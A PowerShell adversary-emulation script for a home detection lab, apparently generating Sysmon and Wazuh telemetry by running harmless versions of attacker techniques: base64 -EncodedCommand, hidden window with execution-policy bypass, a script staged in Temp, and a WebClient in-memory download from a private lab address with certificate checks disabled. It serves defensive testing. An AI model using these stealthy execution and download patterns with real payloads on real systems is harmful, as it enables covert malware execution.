<#
.SYNOPSIS
    Scenario: INC-002 - Controlled Suspicious PowerShell Telemetry Simulator
.DESCRIPTION
    Executes safe, non-destructive commands that mimic common adversary execution
    patterns (encoded commands, hidden window, temporary folder execution, download simulation)
    to generate authentic Sysmon Event ID 1 and Script Block (Event ID 4104) telemetry.
.NOTES
    Safe for educational execution on lab-win11. Confined strictly to localhost/lab.
#>

[CmdletBinding()]
param()

Write-Host "==========================================================" -ForegroundColor Cyan
Write-Host "   ATTACK vs DETECTION LAB -- INC-002 PowerShell Emulation" -ForegroundColor Cyan
Write-Host "==========================================================" -ForegroundColor Cyan
Write-Host ("Timestamp: " + (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))
Write-Host "Target Host: lab-win11 (192.168.56.20)`n"

# 1. Technique A: Base64 Encoded Command Simulation (-EncodedCommand / -enc)
Write-Host "[*] [Technique A] Triggering Base64 Encoded PowerShell Execution (T1059.001)..." -ForegroundColor Yellow
$harmlessCommand = "Write-Output 'DetectLab_Adversary_Emulation_Safe_Payload'; Start-Sleep -Milliseconds 200"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($harmlessCommand)
$base64Payload = [System.Convert]::ToBase64String($bytes)

Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -NonInteractive -EncodedCommand $base64Payload" -Wait
Write-Host "  [-] Executed: powershell.exe -EncodedCommand $base64Payload [OK]" -ForegroundColor Green

Start-Sleep -Seconds 2

# 2. Technique B: Hidden Window & Execution Policy Bypass (-WindowStyle Hidden -ExecutionPolicy Bypass)
Write-Host "[*] [Technique B] Triggering Hidden Window & Bypass Flags..." -ForegroundColor Yellow
Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"Write-Output 'DetectLab_Hidden_Execution'`"" -Wait
Write-Host "  [-] Executed: powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass [OK]" -ForegroundColor Green

Start-Sleep -Seconds 2

# 3. Technique C: Script Execution from User Staging Directory (AppData\Local\Temp)
Write-Host "[*] [Technique C] Executing Script Staged in Temp Directory..." -ForegroundColor Yellow
$tempScriptPath = "$env:TEMP\detectlab_staged_script.ps1"
@"
# Harmless staged script
Write-Output 'DetectLab: Script executed from AppData\Local\Temp'
"@ | Out-File -FilePath $tempScriptPath -Encoding utf8 -Force

Start-Process -FilePath "powershell.exe" -ArgumentList "-File `"$tempScriptPath`"" -Wait
Remove-Item -Path $tempScriptPath -Force -ErrorAction SilentlyContinue
Write-Host "  [-] Executed script from temp staging path and cleaned up. [OK]" -ForegroundColor Green

Start-Sleep -Seconds 2

# 4. Technique D: In-Memory Web Download Simulation via LOLBin (T1105)
Write-Host "[*] [Technique D] Triggering Simulated In-Memory Web Download..." -ForegroundColor Yellow
Start-Process -FilePath "powershell.exe" -ArgumentList "-Command `"[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {\$true}; (New-Object Net.WebClient).DownloadString('http://192.168.56.30:8080/nonexistent-payload.txt')`"" -Wait -ErrorAction SilentlyContinue
Write-Host "  [-] Executed WebClient download string attempt targeting lab-ubuntu. [OK]" -ForegroundColor Green

Write-Host "`n====================== SIMULATION COMPLETE ======================" -ForegroundColor Cyan
Write-Host "[+] All 4 suspicious PowerShell patterns generated."
Write-Host "    Inspect Sysmon Event ID 1 and Wazuh Alert Rules 100010, 100011, 100012."
Write-Host "=================================================================`n"
